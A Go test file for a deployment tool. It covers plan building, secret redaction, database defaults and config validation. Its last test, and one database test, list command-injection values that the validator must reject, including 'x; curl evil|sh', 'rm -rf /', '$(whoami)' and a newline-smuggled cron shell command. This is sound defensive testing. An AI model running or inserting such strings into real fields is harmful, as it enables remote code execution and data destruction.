package deploy

import (
	"errors"
	"strings"
	"testing"
)

func TestEffectiveDomain(t *testing.T) {
	cases := map[string]struct{ env, domain, want string }{
		"production":  {"production", "myapp.com", "myapp.com"},
		"staging":     {"staging", "myapp.com", "staging.myapp.com"},
		"development": {"development", "myapp.com", "dev.myapp.com"},
	}
	for name, tc := range cases {
		cfg := ApplyConfig{Environment: tc.env, Domain: tc.domain}
		if got := cfg.EffectiveDomain(); got != tc.want {
			t.Errorf("%s: EffectiveDomain() = %q, want %q", name, got, tc.want)
		}
	}
}

func TestSpliceGitPAT(t *testing.T) {
	cases := []struct{ url, pat, want string }{
		{"https://github.com/u/r.git", "tok", "https://tok@github.com/u/r.git"},
		{"https://github.com/u/r.git", "", "https://github.com/u/r.git"},
		{"git@github.com:u/r.git", "tok", "git@github.com:u/r.git"}, // SSH URL untouched
	}
	for _, tc := range cases {
		if got := SpliceGitPAT(tc.url, tc.pat); got != tc.want {
			t.Errorf("SpliceGitPAT(%q, %q) = %q, want %q", tc.url, tc.pat, got, tc.want)
		}
	}
}

// fakeRunner records commands and returns canned output.
type fakeRunner struct {
	commands []string
	outputs  map[string]string
	failOn   string
}

func (f *fakeRunner) Run(command string, sudo bool) (string, error) {
	f.commands = append(f.commands, command)
	if f.failOn != "" && strings.Contains(command, f.failOn) {
		return "error output", errors.New("exit 1")
	}
	if out, ok := f.outputs[command]; ok {
		return out, nil
	}
	return "", nil
}

func TestRunDetection(t *testing.T) {
	runner := &fakeRunner{outputs: map[string]string{
		"cat /etc/os-release | grep '^ID=' | cut -d= -f2":         "ubuntu\n",
		"cat /etc/os-release | grep '^VERSION_ID=' | cut -d= -f2": "24.04\n",
		"which nginx": "/usr/sbin/nginx\n",
		"which php":   "/usr/bin/php\n",
		"php -r 'echo PHP_MAJOR_VERSION.\".\".PHP_MINOR_VERSION;'": "8.3\n",
		"which git": "/usr/bin/git\n",
	}}
	det, err := RunDetection(runner)
	if err != nil {
		t.Fatal(err)
	}
	if det.OS != "ubuntu" || det.OSVersion != "24.04" {
		t.Errorf("OS = %s %s", det.OS, det.OSVersion)
	}
	if !det.HasNginx || !det.HasPHP || det.PHPVersion != "8.3" {
		t.Errorf("det = %+v", det)
	}
	if det.IsFresh {
		t.Error("should not be fresh with nginx installed")
	}
}

func TestRunDetectionFresh(t *testing.T) {
	det, _ := RunDetection(&fakeRunner{})
	if !det.IsFresh {
		t.Error("empty server should be fresh")
	}
}

func TestBuildPlanStructure(t *testing.T) {
	cfg := ApplyConfig{
		ProjectName: "shop", Kind: "laravel", Domain: "shop.com",
		Environment: "production", GitURL: "https://github.com/u/shop.git",
		GitBranch: "main", PHPVersion: "8.3", WebServer: "nginx",
	}
	cfg.SSL.Enabled = true
	cfg.SSL.Email = "admin@shop.com"
	cfg.Database.Engine = "mysql"
	cfg.Database.Name = "shop"
	cfg.Database.Password = "hunter2hunter2"

	steps := BuildPlan(cfg)
	if len(steps) < 10 {
		t.Fatalf("plan = %d steps, want substantial", len(steps))
	}
	titles := map[string]string{}
	for _, s := range steps {
		titles[s.Title] = s.Command
	}
	if cmd, ok := titles["Create database and grants"]; !ok || !strings.Contains(cmd, "CREATE DATABASE IF NOT EXISTS shop") {
		t.Errorf("database create step missing or wrong: %q", cmd)
	}
	if cmd, ok := titles["Write database environment"]; !ok || !strings.Contains(cmd, "DB_DATABASE=shop") {
		t.Errorf("database env step missing or wrong: %q", cmd)
	}

	// The database password is spliced into raw commands, and the
	// redactor must mask it in anything shown or stored.
	create := titles["Create database and grants"]
	if !strings.Contains(create, "hunter2hunter2") {
		t.Fatal("known password not spliced into create step")
	}
	if masked := RedactorFor(cfg).Redact(create); strings.Contains(masked, "hunter2hunter2") {
		t.Fatal("redactor leaked the database password")
	}

	// Verify key steps are present.
	present := map[string]bool{}
	for _, s := range steps {
		present[s.Title] = true
	}
	for _, want := range []string{
		"Update package list", "Install PHP 8.3", "Install nginx",
		"Clone repository", "Run migrations", "Write nginx vhost",
		"Obtain SSL certificate",
	} {
		if !present[want] {
			t.Errorf("missing step %q", want)
		}
	}

	// Clone URL should not have PAT (empty).
	for _, s := range steps {
		if s.Title == "Clone repository" && strings.Contains(s.Command, "@github.com") {
			t.Error("PAT present without being set")
		}
	}

	// Staging domain prefix.
	cfg.Environment = "staging"
	steps = BuildPlan(cfg)
	for _, s := range steps {
		if s.Title == "Write nginx vhost" && !strings.Contains(s.Command, "staging.shop.com") {
			t.Error("staging domain not used in vhost")
		}
	}
}

func TestPresetResolution(t *testing.T) {
	preset := &Preset{
		ID:     "kitodock:sample-artisan",
		Name:   "Sample Artisan Script",
		Script: "cd {deploy_root} && php{php_version} artisan migrate --domain={domain}",
	}
	cfg := ApplyConfig{
		ProjectName: "shop", Domain: "shop.com", Environment: "production", PHPVersion: "8.3",
	}

	got := ResolveDeployScript(preset, cfg, nil)
	want := "cd /var/www/shop && php8.3 artisan migrate --domain=shop.com"
	if got != want {
		t.Fatalf("ResolveDeployScript = %q, want %q", got, want)
	}
}

func TestPresetUserVars(t *testing.T) {
	preset := &Preset{
		Script:    "deploy {env_name}",
		Variables: []PresetVar{{Key: "env_name", Label: "Env Name"}},
	}
	cfg := ApplyConfig{}
	got := ResolveDeployScript(preset, cfg, map[string]string{"env_name": "prod-1"})
	if got != "deploy prod-1" {
		t.Fatalf("user var not resolved: %q", got)
	}
}

func TestPresetUnknownTokenLeftInPlace(t *testing.T) {
	preset := &Preset{Script: "echo {unknown_token}"}
	got := ResolveDeployScript(preset, ApplyConfig{}, nil)
	if got != "echo {unknown_token}" {
		t.Fatalf("unknown token replaced: %q", got)
	}
}

func TestValidatePresetVarKeys(t *testing.T) {
	if err := ValidatePresetVarKeys([]PresetVar{{Key: "domain"}}); err == nil {
		t.Error("builtin key accepted as user variable")
	}
	if err := ValidatePresetVarKeys([]PresetVar{{Key: "my_var"}}); err != nil {
		t.Errorf("valid key rejected: %v", err)
	}
}

func TestRunApplySuccess(t *testing.T) {
	runner := &fakeRunner{}
	steps := []Step{
		{Title: "One", Command: "echo 1"},
		{Title: "Two", Command: "echo 2", Sudo: true},
		{Title: "Three", Command: "echo 3", Ignore: true},
	}

	var stepLog []string
	output, err := RunApply(runner, steps, func(i int, title, status string) {
		stepLog = append(stepLog, title+":"+status)
	}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(output, "One") || !strings.Contains(output, "Two") {
		t.Error("output missing step titles")
	}
	if len(runner.commands) != 3 {
		t.Errorf("commands run = %d", len(runner.commands))
	}
	if runner.commands[1] != "sudo -n bash -lc 'echo 2'" {
		t.Errorf("sudo wrapping = %q", runner.commands[1])
	}
}

func TestRunApplyStopsOnError(t *testing.T) {
	runner := &fakeRunner{failOn: "step two"}
	steps := []Step{
		{Title: "One", Command: "step one"},
		{Title: "Two", Command: "step two"},
		{Title: "Three", Command: "step three"},
	}
	_, err := RunApply(runner, steps, nil, nil)
	if err == nil {
		t.Fatal("expected error")
	}
	if len(runner.commands) != 2 {
		t.Errorf("should stop at step 2, ran %d", len(runner.commands))
	}
}

func TestRunApplyIgnoresFailures(t *testing.T) {
	runner := &fakeRunner{failOn: "will fail"}
	steps := []Step{
		{Title: "Ignored", Command: "will fail", Ignore: true},
		{Title: "After", Command: "echo after"},
	}
	_, err := RunApply(runner, steps, nil, nil)
	if err != nil {
		t.Fatalf("ignored step should not error: %v", err)
	}
	if len(runner.commands) != 2 {
		t.Errorf("should run both steps, ran %d", len(runner.commands))
	}
}

func TestRedactorMasksSecrets(t *testing.T) {
	cfg := ApplyConfig{GitPAT: "ghp_secrettoken123", Database: Database{Password: "dbpass-dbpass"}}
	r := RedactorFor(cfg)

	cases := []struct{ in, want string }{
		{"clone https://ghp_secrettoken123@github.com/u/r.git", "clone https://*****@github.com/u/r.git"},
		{"mysql identified by 'dbpass-dbpass'", "mysql identified by '*****'"},
		{"no secrets here", "no secrets here"},
	}
	for _, c := range cases {
		if got := r.Redact(c.in); got != c.want {
			t.Errorf("Redact(%q) = %q, want %q", c.in, got, c.want)
		}
	}

	// Unknown credentials inside URLs are masked by shape, even when the
	// literal was never registered.
	shaped := r.Redact("fatal: unable to access 'https://other:pw@x/y.git'")
	if !strings.Contains(shaped, "*****@x/y.git") {
		t.Errorf("shape masking = %q", shaped)
	}

	// Redacted steps keep structure but lose commands' secrets.
	steps := []Step{{Title: "Clone", Command: "git clone https://ghp_secrettoken123@h/r.git"}}
	masked := r.RedactSteps(steps)
	if strings.Contains(masked[0].Command, "ghp_secrettoken123") {
		t.Error("RedactSteps leaked the PAT")
	}
	if masked[0].Title != "Clone" || steps[0].Command == masked[0].Command {
		t.Error("RedactSteps mutated structure or the original slice")
	}

	// Trivial secrets are not masked (noise) and String never leaks.
	if NewRedactor("abc").Redact("abc") != "abc" {
		t.Error("short secret should be ignored")
	}
	if s := r.String(); strings.Contains(s, "ghp") || strings.Contains(s, "dbpass") {
		t.Errorf("String leaked: %q", s)
	}
}

func TestNormalizeDatabaseAccess(t *testing.T) {
	// No engine: disabled, untouched.
	db, err := NormalizeDatabaseAccess(Database{})
	if err != nil || db.Engine != "" {
		t.Fatalf("disabled database errored: %v %+v", err, db)
	}

	// Defaults fill in port, host, user, password.
	db, err = NormalizeDatabaseAccess(Database{Engine: "mysql", Name: "shop"})
	if err != nil {
		t.Fatal(err)
	}
	if db.AccessPort != DefaultMySQLPort || db.AccessHost != "127.0.0.1" || db.User != "root" {
		t.Errorf("mysql defaults = %+v", db)
	}
	if len(db.Password) != 24 {
		t.Errorf("generated password length = %d", len(db.Password))
	}

	db, err = NormalizeDatabaseAccess(Database{Engine: "postgres", Name: "shop"})
	if err != nil {
		t.Fatal(err)
	}
	if db.AccessPort != DefaultPostgresPort || db.User != "postgres" {
		t.Errorf("postgres defaults = %+v", db)
	}

	// Provided values survive; generated passwords are stable across calls
	// when already set.
	given := Database{Engine: "mysql", Name: "shop", Password: "keepme-keepme", AccessPort: 6033, User: "svc", AccessHost: "db.lan"}
	db, err = NormalizeDatabaseAccess(given)
	if err != nil || db.Password != "keepme-keepme" || db.AccessPort != 6033 || db.User != "svc" || db.AccessHost != "db.lan" {
		t.Errorf("explicit values not preserved: %+v err=%v", db, err)
	}

	// Errors: unknown engine; missing name; unsafe name.
	if _, err := NormalizeDatabaseAccess(Database{Engine: "oracle", Name: "x"}); err == nil {
		t.Error("unknown engine accepted")
	}
	if _, err := NormalizeDatabaseAccess(Database{Engine: "mysql"}); err == nil {
		t.Error("missing name accepted")
	}
	if _, err := NormalizeDatabaseAccess(Database{Engine: "mysql", Name: "a; rm -rf /"}); err == nil {
		t.Error("unsafe name accepted")
	}
}

func TestBuildPlanDatabaseMisconfiguration(t *testing.T) {
	cfg := ApplyConfig{ProjectName: "shop", Domain: "shop.com"}
	cfg.Database.Engine = "mysql" // engine without name
	steps := BuildPlan(cfg)
	if len(steps) != 1 || steps[0].Title != "Validate database configuration" {
		t.Fatalf("misconfigured plan = %+v", steps)
	}
}

func TestBuildDestroyPlan(t *testing.T) {
	cfg := ApplyConfig{
		ProjectName: "shop", Domain: "shop.com", GitBranch: "main",
		Database: Database{Engine: "mysql", Name: "shop"},
	}

	steps := BuildDestroyPlan(cfg, false)
	titles := setOfTitles(steps)
	for _, want := range []string{"Disable site", "Remove nginx vhost", "Remove auto-deploy cron", "Test nginx configuration", "Reload nginx", "Archive webroot"} {
		if !titles[want] {
			t.Errorf("destroy plan missing %q: %v", want, titles)
		}
	}
	for _, s := range steps {
		if strings.Contains(s.Command, "DROP DATABASE") {
			t.Error("destroy without dropDatabase still drops the database")
		}
	}
	// The webroot is moved aside, never rm -rf'd in place.
	archived := false
	for _, s := range steps {
		if s.Title == "Archive webroot" {
			archived = strings.Contains(s.Command, "mv /var/www/shop") && !strings.Contains(s.Command, "rm -rf /var/www/shop\n")
		}
	}
	if !archived {
		t.Error("webroot not archived aside")
	}

	steps = BuildDestroyPlan(cfg, true)
	dropped := false
	for _, s := range steps {
		if strings.Contains(s.Command, "DROP DATABASE IF EXISTS shop") {
			dropped = true
		}
	}
	if !dropped {
		t.Error("dropDatabase=true did not drop the database")
	}
}

func setOfTitles(steps []Step) map[string]bool {
	out := map[string]bool{}
	for _, s := range steps {
		out[s.Title] = true
	}
	return out
}

func TestValidateApplyConfigRejectsInjection(t *testing.T) {
	cases := []ApplyConfig{
		{ProjectName: "x; curl evil|sh", Domain: "ok.io"},
		{ProjectName: "../..", Domain: "ok.io"},
		{ProjectName: "shop", Domain: "ok.io; rm -rf /"},
		{ProjectName: "shop", Domain: "$(whoami).io"},
		{ProjectName: "shop", Domain: "ok.io", GitBranch: "main; touch /tmp/pwn"},
		{ProjectName: "shop", Domain: "ok.io", GitURL: "https://a.b/x.git && echo hi"},
		{ProjectName: "shop", Domain: "ok.io", GitPAT: "ghp_with;semicolon"},
		{ProjectName: "shop", Domain: "ok.io", PHPVersion: "8.3 && echo hi"},
		{ProjectName: "shop", Domain: "ok.io", AutoDeployCron: "* * * * * x\n/bin/bash -c pwn"},
		{ProjectName: "shop", Domain: "ok.io", Database: Database{Engine: "mysql", Name: "db; drop all", Password: "longenough123"}},
		{ProjectName: "shop", Domain: "ok.io", Database: Database{Engine: "mysql", Name: "shop", Password: "pwn'd-12345"}},
	}
	for i, cfg := range cases {
		if err := ValidateApplyConfig(cfg); err == nil {
			t.Errorf("case %d accepted: %+v", i, cfg)
		}
	}
	good := ApplyConfig{
		ProjectName: "shop", Domain: "shop.io", Environment: "production",
		Kind: "laravel", GitBranch: "main", GitURL: "https://github.com/u/r.git",
		PHPVersion: "8.3", Database: Database{Engine: "mysql", Name: "shop"},
	}
	if err := ValidateApplyConfig(good); err != nil {
		t.Fatalf("valid config rejected: %v", err)
	}
	// Injection configs must never produce a runnable plan.
	steps := BuildPlan(cases[0])
	if len(steps) != 1 || steps[0].Title != "Validate configuration" {
		t.Fatalf("injection produced a plan: %+v", steps[:1])
	}
}
